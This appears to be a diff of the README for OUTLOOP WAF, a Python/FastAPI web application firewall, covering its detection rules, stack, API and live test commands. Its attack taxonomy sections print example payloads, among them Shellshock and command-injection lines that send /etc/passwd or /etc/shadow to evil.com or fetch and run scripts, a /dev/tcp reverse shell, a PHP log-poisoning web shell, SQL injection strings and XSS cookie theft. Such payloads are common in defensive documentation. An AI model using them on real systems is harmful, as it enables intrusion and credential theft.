+**OUTLOOP Countermeasures:** 13 patterns targeting `<script>` tags, inline event handlers (`onerror=`, `onload=`, `onclick=`), `javascript:` protocol URIs, `data:text/html` payloads, and SVG/iframe vectors. HTML-entity-encoded variants (`&lt;script&gt;`) are normalized by the decoder before evaluation.
+
+**Live Verification:**
+```bash
+curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=<script>alert(document.cookie)</script>"
+# HTTP/1.1 403 Forbidden
+# { "blocked": true, "rule_id": "XSS-003", "severity": "HIGH" }
+```
+
+---
+
+### Remote Code Execution (RCE) — CWE-78 · CVE-2014-6271
+
+RCE vulnerabilities allow attackers to execute arbitrary operating system commands on the host. The most critical exposure is **Shellshock** (CVE-2014-6271) — a GNU Bash vulnerability where function definitions in environment variables execute attached commands.
+
+**Attack Taxonomy:**
+
+```bash
+# ─── Shellshock — User-Agent Header Injection (CVE-2014-6271) ────────────
+User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd | curl -d @- evil.com'
+
+# ─── Command Injection via Query Parameter ────────────────────────────────
+https://target.com/ping?host=127.0.0.1; curl http://evil.com/shell.sh | bash
+
+# ─── Backtick Subshell Execution ─────────────────────────────────────────
+?query=`wget http://evil.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`
+
+# ─── $() Subshell Syntax ─────────────────────────────────────────────────
+?input=$(cat /etc/shadow | base64 | curl -d @- https://evil.com/exfil)
+
+# ─── Reverse Shell via Bash TCP Redirect ─────────────────────────────────
+?cmd=bash -i >& /dev/tcp/attacker.com/4444 0>&1
+```
+
+**OUTLOOP Countermeasures:** Dedicated Shellshock pattern matching `() { :;`, backtick operators, `$()` subshell syntax, and reverse shell redirect operators. Complementary command injection rules cover `;`, `|`, `&&`, `||` paired with shell commands (`cat`, `wget`, `curl`, `bash`, `sh`).
+
+**Live Verification:**
+```bash
+curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=()%20{%20:;%20};%20/bin/bash%20-i"
+# HTTP/1.1 403 Forbidden
+# { "blocked": true, "rule_id": "RCE-001", "severity": "CRITICAL" }
+```
+
+---
+
+### Path Traversal — CWE-22
+
+Path traversal attacks navigate relative directory sequences (`../`) to access files outside the intended web root — commonly targeting `/etc/passwd`, `/etc/shadow`, `.env` files, and private keys.
+
+**Attack Taxonomy:**
+
+```
+# ─── Standard Unix Traversal ─────────────────────────────────────────────
+../../../../etc/passwd
+../../../../etc/shadow
+
+# ─── Null Byte Injection (bypasses extension filters in legacy PHP) ───────
+../../../../etc/passwd%00.jpg
+
+# ─── Windows Directory Traversal ─────────────────────────────────────────
+..\..\..\..\windows\system32\drivers\etc\hosts
+
+# ─── URL-Encoded Traversal (single-pass decoder bypass) ──────────────────
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# ─── Double URL-Encoded Traversal (double-pass decoder bypass) ───────────
+%252e%252e%252fetc%252fpasswd
+
+# ─── Sensitive Targets ────────────────────────────────────────────────────
+/proc/self/environ          # Environment variables including secrets
+/.git/config                # Git config leaking remote URLs
+/.env                       # Application secrets and API keys
+/var/www/html/../config.php # Web application config
+```
+
+**OUTLOOP Countermeasures:** 9 patterns covering `../`, `..\`, all URL encoding variants, double-encoding, null-byte injection, and direct sensitive path references (`.env`, `.git`, `passwd`, `shadow`, `system32`).
+
+**Live Verification:**
+```bash
+curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=../../../../etc/passwd"
+# HTTP/1.1 403 Forbidden
+# { "blocked": true, "rule_id": "PATH-002", "severity": "HIGH" }
+```
+
+---
+
+### Server-Side Request Forgery (SSRF) — CWE-918 · OWASP A10:2021
+
+SSRF coerces the server into making HTTP requests to internal network addresses on behalf of the attacker. In cloud environments, the primary risk is **metadata endpoint abuse** — AWS, GCP, and Azure all expose unauthenticated instance credential endpoints at link-local IPs (`169.254.x.x`).
+
+**Attack Taxonomy:**
+
+```
+# ─── AWS EC2 Instance Metadata (IAM Credential Theft) ────────────────────
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/user-data
+
+# ─── Google Cloud Metadata ────────────────────────────────────────────────
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# ─── Internal Network Probing (firewall bypass) ───────────────────────────
+http://192.168.1.1/admin          # LAN gateway admin panel
+http://10.0.0.1:8080/internal-api # Internal microservice
+http://localhost:6379/            # Redis without auth
+
+# ─── Loopback Abuse ───────────────────────────────────────────────────────
+http://127.0.0.1:8000/api/admin   # Bypass external auth via localhost trust
+http://[::1]:8000/admin           # IPv6 loopback variant
+```
+
+**OUTLOOP Countermeasures:** 7 patterns blocking `169.254.169.254`, `metadata.google.internal`, RFC-1918 private ranges (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`), and loopback addresses (`localhost`, `127.0.0.1`, `::1`).
+
+**Live Verification:**
+```bash
+curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=http://169.254.169.254/latest/meta-data/"
+# HTTP/1.1 403 Forbidden
+# { "blocked": true, "rule_id": "SSRF-001", "severity": "HIGH" }
+```
+
+---
+
+### Command Injection — CWE-77
+
+Command injection occurs when user input is passed unsanitized to a system shell invocation — common in applications calling `os.system()`, `subprocess.run()`, or PHP `exec()` with user-controlled arguments.
+
+**Attack Taxonomy:**
+
+```bash
+# ─── Semicolon Chaining ───────────────────────────────────────────────────
+127.0.0.1; cat /etc/shadow
+
+# ─── Pipe to Attacker ────────────────────────────────────────────────────
+127.0.0.1 | curl -d "$(cat /etc/passwd)" https://evil.com
+
+# ─── AND/OR Shell Operator Chaining ──────────────────────────────────────
+127.0.0.1 && wget http://evil.com/backdoor.sh -O /tmp/b && bash /tmp/b
+
+# ─── Subshell Execution ───────────────────────────────────────────────────
+$(whoami)
+`id && uname -a`
+
+# ─── Environment Variable Injection ──────────────────────────────────────
+$PATH/../../../bin/sh
+${IFS}cat${IFS}/etc/passwd
+```
+
+**OUTLOOP Countermeasures:** 8 patterns covering shell chaining operators (`;`, `|`, `&&`, `||`), backtick and `$()` subshell execution, and signature matching for shell utilities (`cat`, `wget`, `curl`, `whoami`, `id`, `uname`, `ps`, `ls`).
+
+**Live Verification:**
+```bash
+curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=\$(whoami)"
+# HTTP/1.1 403 Forbidden
+# { "blocked": true, "rule_id": "CMD-001", "severity": "CRITICAL" }
+```
+
+---
+
+### Local File Inclusion (LFI) — CWE-98
+
+LFI allows attackers to include server-side files in HTTP responses. Commonly escalates to RCE via **log poisoning**: inject PHP code into a log file through a controlled field (e.g., User-Agent), then include the log via LFI to execute it.
+
+**Attack Taxonomy:**
+
+```
+# ─── Direct Sensitive File Inclusion ─────────────────────────────────────
+?page=../../../../etc/passwd
+?file=../config/database.php
+
+# ─── Log Poisoning — Step 1: Inject PHP into User-Agent ──────────────────
+User-Agent: <?php system($_GET['cmd']); ?>
+# Step 2: Include the Apache access log via LFI:
+?page=../../../../var/log/apache2/access.log&cmd=id
+
+# ─── PHP Wrapper Abuse ────────────────────────────────────────────────────
+?file=php://filter/convert.base64-encode/resource=/etc/passwd
+?file=php://input                  # With PHP code in POST body
+?file=phar://uploaded-archive.zip  # PHAR deserialization
+
+# ─── Session File Inclusion ───────────────────────────────────────────────
+?page=../../../../var/lib/php/sessions/sess_[PHPSESSID]
+```
+
+**OUTLOOP Countermeasures:** 5 patterns targeting `include()`, `require()`, `php://` wrapper schemes, `phar://`, and direct references to sensitive system files.
+
+---
+
+## Technology Stack
+
+### Python 3.9+ — Core WAF Runtime
+
+The WAF engine is written in Python 3.9+ specifically for its `re` module's `re.compile()` — patterns are compiled once at application startup into finite automata, allowing O(n) string evaluation regardless of pattern complexity. All 57 signatures are pre-compiled and held in memory for the lifetime of the serverless function instance.
+
+Key Python features used: `asyncio` for the ASGI async request lifecycle, `re.compile()` with `re.IGNORECASE` flags for case-insensitive pattern matching, `urllib.parse.unquote()` and `base64.b64decode()` for the multi-pass decoder chain, and `uuid.uuid4()` for per-request tracing identifiers.
+
+### FastAPI 0.109+ — ASGI Web Framework
+
+FastAPI provides the ASGI application server and the `BaseHTTPMiddleware` hook point used by `waf/middleware.py`. Every inbound request passes through the middleware's `dispatch()` method before any route handler is invoked. FastAPI also auto-generates the OpenAPI schema served at `/api/docs` and `/api/redoc` from route decorator metadata.
+
+The middleware intercept pattern:
+
+```python
+class WAFMiddleware(BaseHTTPMiddleware):
+    async def dispatch(self, request: Request, call_next):
+        # All inspection logic executes here — before any route handler
+        threat = await engine.evaluate(request)
+        if threat:
+            return JSONResponse({"blocked": True, "rule_id": threat.rule_id}, status_code=403)
+        response = await call_next(request)
+        response.headers["X-WAF-Status"] = "clean"
+        return response
+```
+
+### Starlette — ASGI Middleware Foundation
+
+Starlette is FastAPI's underlying ASGI toolkit. `BaseHTTPMiddleware` from Starlette is the class OUTLOOP subclasses to intercept request scopes. Starlette's `Request` object provides `.query_params`, `.headers`, `.body()` — the three surfaces inspected by the WAF engine.
+
+### Uvicorn — ASGI Production Server
+
+Uvicorn is the ASGI server runtime that translates incoming HTTP connections into ASGI scope dictionaries passed to FastAPI. On Vercel, the Python runtime wraps the FastAPI app with an ASGI adapter; locally, `uvicorn api.index:app --reload` is used for development with hot-reload support.
+
+### Three.js r160 — Attack Globe Visualization
+
+The SOC dashboard hero renders a WebGL particle globe using Three.js. Incoming attack events animate as arcs from their source IP geolocation to the server location. The particle system uses `BufferGeometry` for GPU-side position arrays and `ShaderMaterial` for custom GLSL glow effects.
+
+### Server-Sent Events (SSE) — Real-Time Telemetry
+
+The threat stream at `/api/events/threats` uses the `text/event-stream` MIME type — a unidirectional HTTP push protocol. The FastAPI endpoint yields a `StreamingResponse` with an async generator that dequeues threat events as they occur. The browser uses the native `EventSource` API to consume the stream, with built-in reconnection on disconnect.
+
+SSE was chosen over WebSockets because threat telemetry is unidirectional — the server pushes, the client only reads. SSE has lower handshake overhead and works over standard HTTP/2 multiplexing.
+
+### Pytest 7.x — Security Test Suite
+
+The 44-test suite covers 8 test modules with attack payload verification:
+
+| Module | Tests | Coverage Area |
+|--------|-------|---------------|
+| `test_waf.py` | 23 | SQLi, XSS, RCE, LFI, Path Traversal, Command Injection, SSRF payloads |
+| `test_health.py` | 6 | Health, readiness, metrics endpoints |
+| `test_evasion.py` | varies | Encoded payloads, double-encoding bypass attempts |
+| `test_rate_limiter.py` | varies | Burst rate enforcement |
+| `test_admin.py` | 3 | Admin key auth, IP ban, blocklist |
+| `test_events.py` | varies | SSE stream connection and event format |
+| `test_metrics.py` | varies | Counter accuracy |
+| `test_antigravity.py` | 3 | Route and status endpoint coverage |
+
+Each WAF rule has a corresponding positive test (blocked) and negative test (clean) in `test_waf.py`. New signatures require both before merge.
+
+### Vercel Serverless — Edge Deployment
+
+The WAF runs as a Vercel Python Serverless Function via `@vercel/python`. The `vercel.json` routing table directs all `/api/*` paths to `api/index.py` and serves static assets from `api/static/` via CDN. Cold starts are ~300ms; warm invocations execute in under 10ms.
+
+---
+
+## Feature Breakdown
+
+### Interactive Payload Sandbox
+
+The Sandbox at [/#playground](https://outloop-waf.vercel.app/#playground) is a browser-native WAF testing environment eliminating the need for curl, Postman, or local setup. One-click presets fire production attack payloads directly at the WAF engine and surface the full inspection result.
+
+**Presets Available:**
+
+| Preset | Payload Sample | Rule Triggered | Severity |
+|--------|---------------|----------------|----------|
+| SQL Injection | `' OR 1=1; --` | SQLi-001 | CRITICAL |
+| XSS | `<script>alert(document.cookie)</script>` | XSS-003 | HIGH |
+| SSRF / Metadata | `http://169.254.169.254/latest/meta-data/` | SSRF-001 | HIGH |
+| Shellshock RCE | `() { :; }; /bin/bash -i` | RCE-001 | CRITICAL |
+| Local File Inclusion | `../../../../etc/passwd%00` | LFI-002 | HIGH |
+| Path Traversal | `../../windows/system32/cmd.exe` | PATH-004 | MEDIUM |
+| Command Injection | `127.0.0.1; cat /etc/shadow` | CMD-001 | CRITICAL |
+| Clean Request | `HelloWAF` | *(none)* | — |
+
+The sandbox renders a live **5-stage pipeline visualization** highlighting the exact gate that flagged the payload: Inbound HTTP → Multi-Decoder → Regex Match → Policy Layer → Final Verdict.
+
+---
+
+### Real-Time SOC Threat Stream
+
+The Threat Stream at [/#threats](https://outloop-waf.vercel.app/#threats) uses Server-Sent Events to push blocked attack records to the dashboard without polling.
+
+**Live SSE Event Schema:**
+
+```json
+{
+  "rule_id": "SQLi-007",
+  "severity": "CRITICAL",
+  "description": "UNION SELECT injection intercepted",
+  "source_ip": "203.0.113.xxx",
+  "timestamp": "2026-06-19T10:22:01.442Z",
+  "request_id": "550e8400-e29b-41d4-a716-446655440000"
+}
+```
+
+The stream maintains a live **severity counter** (CRITICAL / HIGH / MEDIUM / LOW) updating in real time as events arrive. The client-side reconnection wrapper handles CDN timeout disconnects with exponential backoff.
+
+---
+
+### Signature Intelligence Explorer
+
+The Explorer at [/#rules](https://outloop-waf.vercel.app/#rules) provides a searchable, filterable view of all 57 compiled signatures. Standard users see rule names and IDs; entering an admin key in the Workspace reveals raw regex patterns.
+
+Rules are searchable by Rule Name, Rule ID, or Regex Pattern, and filterable by severity tier.
+
+---
+
+### Admin Operations Workspace
+
+The Workspace at [/#admin](https://outloop-waf.vercel.app/#admin) provides a terminal-aesthetic command console for live WAF management.
+
+| Command / Action | Endpoint | Description |
+|-----------------|----------|-------------|
+| `waf admin stats` | `GET /api/admin/stats` | Total requests, blocked count, uptime, active rules |
+| `waf blocklist show` | `GET /api/admin/blocklist` | All banned IPs with reason and ban timestamp |
+| Ban an IP | `POST /api/admin/ban` | Immediately block a target IP with reason |
+| Remove ban | `DELETE /api/admin/ban/{ip}` | Lift an existing IP block |
+| View all rules | `GET /api/admin/rules` | Full 57-signature list with regex patterns |
+
+**Live Status Bar** (persistent footer):
+
+```
+OUTLOOP WAF v1.0.0  |  REQ: 00247  |  BLOCKED: 00031  |  RULES: 57  |  GRAVITY: 9.8 m/s²  |  12:34:56 UTC
+```
+
+---
+
+### Zero-Gravity Easter Egg
+
+Clicking **GRAVITY** in the footer calls `/api/gravity?code=1807` with header `X-Antigravity: true`. On HTTP 418 (I'm a Teapot), the entire dashboard enters zero-gravity mode — panels drift and rotate via CSS floating keyframe animations until gravity is re-enabled.
+
+---
+
+## API Reference
+
+Full interactive documentation: [Swagger UI](https://outloop-waf.vercel.app/api/docs) · [ReDoc](https://outloop-waf.vercel.app/api/redoc)
+
+### Public Endpoints
+
+| Method | Endpoint | Description | Response |
+|--------|----------|-------------|----------|
+| `GET` | `/api/health` | Service health check | `{"status": "healthy", "version": "1.0.0", "rules": 57}` |
+| `GET` | `/api/ready` | Readiness probe | `{"ready": true, "engine": "loaded"}` |
+| `GET` | `/api/metrics` | Traffic counters | `{"total": 1024, "blocked": 312, "allowed": 712, "uptime_s": 3600}` |
+| `GET` | `/api/status` | Engine status | `{"gravity": "9.8 m/s²", "engine": "ACTIVE"}` |
+| `GET` | `/api/secure/test` | WAF inspection sandbox | `200 {"clean": true}` or `403 {"blocked": true, "rule_id": "..."}` |
+| `GET` | `/api/secure/echo` | Echo headers through WAF | `{"headers": {...}, "waf_status": "clean"}` |
+| `GET` | `/api/events/threats` | SSE threat stream | `text/event-stream` — continuous JSON event data |
+
+### Admin Endpoints — `X-Admin-Key` Required
+
+| Method | Endpoint | Description | Body |
+|--------|----------|-------------|------|
+| `GET` | `/api/admin/stats` | Detailed engine statistics | — |
+| `GET` | `/api/admin/rules` | Full signature list with regex patterns | — |
+| `GET` | `/api/admin/blocklist` | All currently banned IPs | — |
+| `POST` | `/api/admin/ban` | Add IP to blocklist | `{"ip": "...", "reason": "..."}` |
+| `DELETE` | `/api/admin/ban/{ip}` | Remove IP from blocklist | — |
+
+### Live Test Commands
+
+```bash
+# Health check
+curl https://outloop-waf.vercel.app/api/health
+
+# Clean payload — expect 200
+curl "https://outloop-waf.vercel.app/api/secure/test?payload=HelloWAF"
+
+# SQL Injection — expect 403 CRITICAL
+curl "https://outloop-waf.vercel.app/api/secure/test?payload=' UNION SELECT username, password FROM users --"
+
+# XSS — expect 403 HIGH
+curl "https://outloop-waf.vercel.app/api/secure/test?payload=<script>alert(document.cookie)</script>"
+
+# Path Traversal — expect 403 HIGH
+curl "https://outloop-waf.vercel.app/api/secure/test?payload=../../../../etc/passwd"
+
+# Command Injection — expect 403 CRITICAL
+curl "https://outloop-waf.vercel.app/api/secure/test?payload=\$(whoami)"
+
+# SSRF AWS Metadata — expect 403 HIGH
+curl "https://outloop-waf.vercel.app/api/secure/test?payload=http://169.254.169.254/latest/meta-data/"
+
+# Shellshock RCE — expect 403 CRITICAL
+curl "https://outloop-waf.vercel.app/api/secure/test?payload=()%20{%20:;%20};%20/bin/bash%20-i"
+
+# Subscribe to live threat stream
+curl -H "Accept: text/event-stream" https://outloop-waf.vercel.app/api/events/threats
+
+# Admin — ban an IP (replace with your key)
+curl -X POST https://outloop-waf.vercel.app/api/admin/ban \
+  -H "X-Admin-Key: your-admin-key" \
+  -H "Content-Type: application/json" \
+  -d '{"ip": "203.0.113.42", "reason": "Automated SQLi scanner"}'
+```
+
+---
+
+## Deployment & Infrastructure
+
+OUTLOOP WAF runs entirely on **Vercel's serverless edge platform** — no dedicated servers, no ops burden.
+
+### Vercel Deployment Architecture
 
 ```mermaid
 graph LR
@@ -416,16 +992,16 @@ graph LR
 
     subgraph VCL["Vercel Platform"]
         direction TB
-        CI[Build Step\npip install dependencies]
-        FUNC[Serverless Function\napi/index.py - Python runtime]
+        CI[Build Step\npip install deps]
+        FUNC[Serverless Function\napi/index.py · Python runtime]
         CDN[Global CDN\nStatic assets: HTML · CSS · JS]
         EDGE[Edge Network\n100+ PoPs worldwide]
     end
 
     subgraph DNS["Production Endpoints"]
         LIVE[outloop-waf.vercel.app]
-        API_D[/api/* routes to Function]
-        STAT[/* routes to CDN]
+        API_D[/api/* → Serverless Function]
+        STAT[/* → CDN]
     end
 
     SRC -->|git push main| CI
@@ -440,587 +1016,16 @@ graph LR
     LIVE --> STAT
 ```
 
----
-
-### 9. SSE Real-Time Data Flow
-
-```mermaid
-sequenceDiagram
-    participant MW as WAF Middleware
-    participant Q as In-Memory Event Queue
-    participant SSE as SSE Generator (/api/events/threats)
-    participant D as Dashboard (EventSource)
-
-    Note over D,SSE: Client opens persistent connection
-
-    D->>SSE: GET /api/events/threats
-    SSE-->>D: HTTP 200 Content-Type: text/event-stream
-
-    Note over MW,Q: Attack detected at WAF layer
-
-    MW->>Q: enqueue rule_id SQLi-007, severity CRITICAL, source_ip, description, timestamp
-
-    Q-->>SSE: Dequeue event
-    SSE-->>D: data: rule_id SQLi-007, severity CRITICAL, source_ip, timestamp
-
-    D->>D: Parse event, append row to threat table
-    D->>D: Update severity counter CRITICAL++
-    D->>D: Flash status bar
-
-    Note over MW,Q: Second attack detected
-
-    MW->>Q: enqueue rule_id XSS-003, severity HIGH
-    Q-->>SSE: Dequeue
-    SSE-->>D: data: rule_id XSS-003
-```
-
----
-
-### 10. Authentication & Admin Authorization Flow
-
-```mermaid
-flowchart TD
-    ADMIN([Admin User]) --> INPUT[Enter X-Admin-Key\nin Dashboard Workspace]
-    INPUT --> REQ_A[POST /api/admin/stats\nHeader: X-Admin-Key: ***]
-    REQ_A --> MW_A{WAF Middleware\nInspect Request}
-    MW_A -->|Payload clean| AUTH{Validate\nX-Admin-Key}
-    AUTH -->|Invalid / Missing| E401[401 Unauthorized\nAccess denied]
-    AUTH -->|Valid| PRIV{Requested\nOperation}
-    PRIV -->|Read Stats| STATS[Return engine metrics\nrequests · blocked · uptime]
-    PRIV -->|Ban IP| BAN[Add IP to blocklist\nPersist in-memory store]
-    PRIV -->|List Rules| RULES[Return 57 signatures\nID · Name · Severity · Pattern]
-    STATS & BAN & RULES --> RESP_A([200 OK + JSON payload])
-    E401 --> END([Client receives error])
-
-    style AUTH fill:#1a1a2e,stroke:#e94560
-    style E401 fill:#2d1b1b,stroke:#e94560
-```
-
----
-
-## Research Foundation
-
-The architecture and detection patterns in OUTLOOP WAF are grounded in established security research and industry standards:
-
-| # | Reference | Type | Relevance |
-|---|-----------|------|-----------|
-| 1 | [OWASP Top Ten 2021](https://owasp.org/Top10/) | Industry Standard | Primary threat taxonomy — SQLi (A03), XSS (A03), SSRF (A10) detection priorities |
-| 2 | [NIST SP 800-44 v2: Securing Web Servers](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final) | NIST Standard | Foundational reference for web server hardening, header validation, and access control |
-| 3 | [NIST SP 800-95: Guide to Secure Web Services](https://csrc.nist.gov/publications/detail/sp/800-95/final) | NIST Standard | Informs the API gateway security model and authentication pattern for admin routes |
-| 4 | [RFC 7230 – HTTP/1.1 Message Syntax and Routing](https://datatracker.ietf.org/doc/html/rfc7230) | IETF RFC | Defines header parsing rules used to detect CRLF injection and header overflow attacks |
-| 5 | [RFC 2697 – A Single Rate Three Color Marker](https://datatracker.ietf.org/doc/html/rfc2697) | IETF RFC | Token-bucket algorithm basis for the rate_limit_evaluator module |
-| 6 | [CWE Top 25 Most Dangerous Software Weaknesses (2023)](https://cwe.mitre.org/top25/) | MITRE Standard | CWE-89 (SQLi), CWE-79 (XSS), CWE-22 (Path Traversal) directly map to WAF rule categories |
-| 7 | Clarke, J. (2009). *SQL Injection Attacks and Defense*. Syngress. | Book | Foundation for the 13 SQL injection patterns including UNION-based, blind, and time-based SQLi |
-| 8 | Cox, R. (2007). [Regular Expression Matching Can Be Simple and Fast](https://swtch.com/~rsc/regexp/regexp1.html) | Research Paper | Basis for compiled-regex approach over interpreted matching; informs sub-5ms detection performance |
-| 9 | Grossman, J. (2006). *XSS Attacks: Cross Site Scripting Exploits and Defense*. Syngress. | Book | Informs the three XSS detection classes: Reflected, Stored, and DOM-based pattern fingerprints |
-| 10 | [OWASP WAF Evaluation Criteria v1.0](https://owasp.org/www-project-web-application-firewall-evaluation-criteria/) | OWASP Guide | Benchmark used to validate signature coverage across attack categories and false-positive targets |
-| 11 | Ristic, I. (2010). *ModSecurity Handbook*. Feisty Duck. | Book | Reference implementation for WAF middleware architecture; informs the rule chaining model |
-| 12 | Zalewski, M. (2011). *The Tangled Web: A Guide to Securing Modern Web Applications*. No Starch Press. | Book | Informs browser-side trust model; basis for multi-pass decoder's evasion-mitigation strategy |
-
----
-
-## Feature Analysis & Metrics
-
-### Threat Distribution (Active Signatures by Category)
-
-```mermaid
-pie title WAF Signature Distribution (57 Total)
-    "SQL Injection" : 13
-    "Cross-Site Scripting" : 13
-    "Path Traversal" : 9
-    "Command Injection" : 8
-    "SSRF / Metadata" : 7
-    "Local File Inclusion" : 5
-    "Header Attacks (CRLF)" : 2
-```
-
-### Blocked vs Allowed Requests (Simulated Traffic Analysis)
-
-```mermaid
-xychart-beta
-    title "Request Outcomes by Attack Category (1000 test payloads)"
-    x-axis ["SQLi", "XSS", "Path Trav.", "Cmd Inj.", "SSRF", "LFI", "Clean"]
-    y-axis "Request Count" 0 --> 200
-    bar [145, 132, 98, 87, 74, 63, 401]
-```
-
-### Detection Severity Profile
-
-```mermaid
-xychart-beta
-    title "Signature Severity Breakdown"
-    x-axis ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
-    y-axis "Signature Count" 0 --> 30
-    bar [14, 22, 15, 6]
-```
-
-### Threat Frequency Trend (Simulated 7-Day Window)
-
-```mermaid
-xychart-beta
-    title "Daily Threat Events (7-Day Window)"
-    x-axis ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
-    y-axis "Events" 0 --> 500
-    line [120, 185, 230, 310, 278, 145, 98]
-```
-
----
-
-## Feature Breakdown
-
-### 🔬 Interactive Payload Sandbox
-
-The **Payload Sandbox Simulator** (`/#playground`) is OUTLOOP's most distinctive feature — a browser-native WAF testing environment that removes the need for curl or Postman.
-
-**Attack Presets Available:**
-
-| Preset | Example Payload | WAF Rule Triggered |
-|--------|-----------------|-------------------|
-| SQL Injection | `' OR 1=1; --` | SQLi-001 (CRITICAL) |
-| Cross-Site Scripting | `<script>alert(document.cookie)</script>` | XSS-003 (HIGH) |
-| SSRF / Metadata | `http://169.254.169.254/latest/meta-data/` | SSRF-001 (HIGH) |
-| Shellshock RCE | `() { :; }; /bin/bash -i` | RCE-001 (CRITICAL) |
-| Local File Inclusion | `../../../../etc/passwd%00` | LFI-002 (HIGH) |
-| Path Traversal | `../../windows/system32/cmd.exe` | PATH-004 (MEDIUM) |
-| Command Injection | `127.0.0.1; cat /etc/shadow` | CMD-001 (CRITICAL) |
-
-The sandbox renders a live **5-stage pipeline visualization** showing which inspection stage flagged the payload: Inbound HTTP → Multi-Decoder → Regex Match → Policy Layer → Final Verdict.
-
----
-
-### 📡 Real-Time Threat Operations Stream
-
-The **Threat Stream** (`/#threats`) uses **Server-Sent Events (SSE)** — a lightweight, one-directional push protocol — to deliver blocked exploit records to the dashboard without polling.
-
-**SSE Event Schema:**
-
-```json
-{
-  "rule_id": "SQLi-007",
-  "severity": "CRITICAL",
-  "description": "UNION SELECT injection detected",
-  "source_ip": "203.0.113.42",
-  "timestamp": "2026-06-18T12:34:56.789Z",
-  "request_id": "550e8400-e29b-41d4-a716-446655440000"
-}
-```
-
-The stream also maintains a live **Severity Distribution Counter** (CRITICAL / HIGH / MEDIUM / LOW / OTHER) that updates in real time as events arrive.
-
----
-
-### 🔎 Rule Intelligence Explorer
-
-The **Signature Explorer** (`/#rules`) provides a searchable, filterable view of all 57 compiled WAF signatures. Features include:
-
-- Filter by severity: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`
-- View raw regex pattern for each rule
-- Admin authentication required to reveal pattern strings (security-by-obscurity layer)
-
-The rules database is defined in `api/waf/rules.py` and pre-compiled at application startup for maximum throughput.
-
----
-
-### 🔄 Request Validation Pipeline Visualizer
-
-The **Architecture Panel** (`/#pipeline`) renders an interactive diagram of the full request lifecycle, from client boundary to downstream route invocation. Users can understand exactly how their requests are being inspected and why a 403 was issued.
-
-Pipeline stages shown:
-1. `CLIENT INBOUND CONNECTION`
-2. `EDGE MIDDLEWARE LAYER` — `rate_limit_evaluator`, `blocklist_perimeter_check`
-3. `WAF ASSESSMENT ENGINE` — `multi_pass_url_decoder`, `regex_signature_evaluator`
-4. `BLOCK PIPELINE` (403) or `FORWARD PIPELINE` (200)
-
----
-
-### ⚙️ Admin Command Center
-
-The **Workspace** (`/#admin`) is a terminal-aesthetic command console secured by `X-Admin-Key` header authentication.
-
-| Command | Action |
-|---------|--------|
-| `waf admin stats` | Returns total requests, blocked count, uptime, active rules |
-| `waf blocklist show` | Lists all banned IPs with reason and timestamp |
-| Ban an IP | POST to `/api/admin/ban` with target IP + reason |
-| Remove ban | DELETE from blocklist via API |
-
-**Live Status Bar** (always visible at bottom of dashboard):
-```
-OUTLOOP WAF v1.0.0 | REQ: 00247 | BLOCKED: 00031 | RULES: 57 | GRAVITY: 9.8 m/s² | 12:34:56 UTC
-```
-
----
-
-## Attack Vectors & Protection Mechanisms
-
-### 1. SQL Injection (SQLi) — CWE-89
-
-SQL Injection is the #1 web vulnerability class (OWASP A03:2021). It occurs when user-supplied input is embedded into SQL queries without parameterization, allowing attackers to alter query logic.
-
-**Impact:** Data exfiltration, authentication bypass, database destruction, privilege escalation.
-
-**How Attackers Exploit It:**
-
-```sql
--- Classic authentication bypass
--- Input: username field → admin' --
--- Resulting server query:
-SELECT * FROM users WHERE username='admin' --' AND password='anything'
--- The -- comments out the password check entirely
-
--- UNION-based data extraction
-' UNION SELECT username, password, NULL FROM users --
-
--- Time-based blind SQLi (boolean inference)
-'; IF (1=1) WAITFOR DELAY '0:0:5' --
-
--- Schema enumeration
-' UNION SELECT table_name,NULL FROM information_schema.tables --
-
--- Stacked command execution
-'; DROP TABLE users; --
-
--- Auth bypass variant
-" OR 1=1 --
-' OR '1'='1
-```
-
-**How OUTLOOP Blocks It:**
-- 13 SQLi patterns covering UNION SELECT, DROP TABLE, xp_cmdshell, WAITFOR, comment stripping (`--`, `/**/`), and quote-based injection
-- Multi-pass decoder catches double-encoded variants like `%27%20OR%20%271%27%3D%271`
-- Tautology detection: `OR 1=1`, `OR 'a'='a'` and similar boolean bypasses
-
-**Live Test:**
-```bash
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=' UNION SELECT username, password FROM users --"
-# → 403 Forbidden — SQLi-007 CRITICAL
-```
-
----
-
-### 2. Cross-Site Scripting (XSS) — CWE-79
-
-XSS allows attackers to inject client-side scripts into pages viewed by other users.
-
-| Type | Mechanism | Persistence |
-|------|-----------|-------------|
-| **Reflected** | Payload in URL/param echoed in response | Non-persistent |
-| **Stored** | Payload saved in DB, served to all users | Persistent |
-| **DOM-based** | Payload processed by JS in browser, never hits server | Client-side |
-
-**How Attackers Exploit It:**
-
-```html
-<!-- Script tag injection — cookie theft -->
-<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
-
-<!-- Event handler injection with base64-encoded payload -->
-<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
-
-<!-- Protocol-based injection -->
-<a href="javascript:document.location='//evil.com/?'+document.cookie">Click me</a>
-
-<!-- SVG vector (bypasses naive script-tag filters) -->
-<svg onload="alert(1)">
-
-<!-- Data URI injection -->
-<iframe src="data:text/html,<script>alert(1)</script>">
-```
-
-**How OUTLOOP Blocks It:**
-- 13 XSS patterns targeting `<script>` tags, inline event handlers (`onerror=`, `onload=`, `onclick=`), `javascript:` protocol URIs, and `data:text/html` payloads
-- Multi-pass decoder catches HTML-entity encoded variants (`&lt;script&gt;`)
-- SVG and iframe tag injection detection
-
-**Live Test:**
-```bash
-curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=<script>alert(document.cookie)</script>"
